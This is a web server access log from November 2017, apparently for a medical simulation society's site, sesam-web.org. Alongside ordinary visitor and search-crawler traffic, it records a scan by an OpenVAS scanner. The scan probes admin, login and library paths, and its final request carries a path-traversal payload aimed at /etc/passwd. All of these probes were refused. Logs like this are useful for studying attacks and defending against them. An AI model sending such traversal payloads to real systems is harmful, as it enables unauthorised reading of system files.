8.17.117.117 - - [07/Nov/2017:20:28:54 +0000] "-" 408 5369 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:36:55 +0000] "GET /ftp/help.html HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
212.121.254.206 - - [07/Nov/2017:08:10:41 +0000] "GET /events/pages/sesam-barcelona-2018/Dates-and-Deadlines-20181/ HTTP/1.1" 200 17495 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
217.64.42.218 - - [08/Nov/2017:04:35:41 +0000] "GET /ecoder/ HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [07/Nov/2017:08:09:45 +0000] "GET /centres/centre/simulhug/ HTTP/1.1" 200 23065 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:37:55 +0000] "GET /scripts/html/portal/login.jsp HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:10 +0000] "OPTIONS / HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:34 +0000] "GET /roller/login.rol HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:25 +0000] "GET /phpmailer/extras HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.83 - - [06/Nov/2017:19:33:27 +0000] "GET /news/march-2015-message-president/ HTTP/1.1" 200 24314 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
198.23.247.140 - - [06/Nov/2017:18:09:13 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)"
217.64.42.218 - - [08/Nov/2017:04:38:07 +0000] "OPTIONS / HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:58 +0000] "GET /signin.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.66 - - [05/Nov/2017:13:47:32 +0000] "GET /events/pages/sesam-lisbon/conference-programme/ HTTP/1.1" 200 21370 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
70.35.220.98 - - [07/Nov/2017:16:04:30 +0000] "GET /events/pages/sesam-barcelona-2018/Conference-Venue-2018/ HTTP/1.1" 200 16996 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:29 +0000] "GET /lib/composer.json HTTP/1.1" 403 5807 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
109.25.142.57 - - [07/Nov/2017:21:48:47 +0000] "GET /centres/centre.json?slug=helios-simulationszentrum-hildesheim HTTP/1.1" 200 1035 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:35:29 +0000] "GET /guestbook.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.12 - - [08/Nov/2017:17:38:39 +0000] "GET /centres/?page=1 HTTP/1.1" 200 19419 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:39:07 +0000] "GET /scripts/editor/CHANGES.md HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:07 +0000] "GET /crowd/services HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.103 - - [07/Nov/2017:00:25:40 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:43 +0000] "GET /cgi-bin/administration/profiles.php HTTP/1.1" 404 6043 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:56 +0000] "GET /scripts/system/admin/modules.php?install=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
